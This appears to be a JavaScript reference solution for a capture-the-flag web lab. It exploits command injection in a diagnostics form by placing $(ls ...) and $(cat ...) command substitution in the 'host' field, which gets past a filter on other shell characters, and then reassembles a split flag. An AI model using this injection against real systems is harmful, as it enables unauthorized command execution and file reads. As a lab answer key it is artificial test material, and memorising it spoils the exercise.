// Reference solve — Beacon, Templar. The probe still blocks ; & | backtick and newline, but the flag is no
// longer at /tmp/beacon/flag.txt: it is torn into a random pair under /tmp/beacon/spool, beside decoy pairs.
// Command substitution runs the probe shell, so first list the spool, then join each pair and keep the one that
// forms a valid HVWA{...} string. The old known path is simply absent at this level. labs:test proves it.
const base = process.argv[2];

async function probe(host) {
  const res = await fetch(`${base}/diagnostics`, {
    method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ host }),
  });
  return res.text();
}

// The echoed line keeps the substitution's newlines, so `ls` may span several lines: scan the whole response
// for file names, not just the first line. (The cat output itself is one line, but scanning the whole response is
// equally safe: the payload names files, never the flag.)
const listing = await probe('$(ls /tmp/beacon/spool)');
const tokens = [...new Set([...listing.matchAll(/part-[12]-([a-f0-9]{8})/g)].map((m) => m[1]))];
for (const token of tokens) {
  const html = await probe(`$(cat /tmp/beacon/spool/part-1-${token} /tmp/beacon/spool/part-2-${token})`);
  const m = /HVWA\{[a-z2-7]{26}\}/.exec(html);
  if (m) { console.log(m[0]); break; }
}
